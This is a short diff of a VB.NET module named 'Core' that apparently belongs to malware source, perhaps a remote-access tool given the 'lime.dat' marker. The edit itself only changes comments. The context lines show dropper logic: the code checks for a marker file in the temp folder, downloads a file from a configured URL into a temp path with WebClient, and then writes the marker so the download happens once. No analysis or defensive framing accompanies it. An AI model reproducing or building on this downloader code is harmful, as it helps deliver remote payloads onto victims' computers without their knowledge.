@@ -121,7 +121,7 @@ Public Module Core
                 If IO.File.Exists(IO.Path.GetTempPath + "\lime.dat") Then
                     'already ran once
                 Else
-                    'didn't run at all or dwchk = false
+                    'didn't run at all
                     Dim DW As New Net.WebClient
                     Dim DWMNAME = IO.Path.GetTempFileName + IO.Path.GetExtension(DWURL)
                     DW.DownloadFile(DWURL, DWMNAME)
@@ -129,6 +129,7 @@ Public Module Core
                     IO.File.Create(IO.Path.GetTempPath + "\lime.dat")
                 End If
             Else
+            'dwchk is false
                 Dim DW As New Net.WebClient
                 Dim DWMNAME = IO.Path.GetTempFileName + IO.Path.GetExtension(DWURL)
                 DW.DownloadFile(DWURL, DWMNAME)
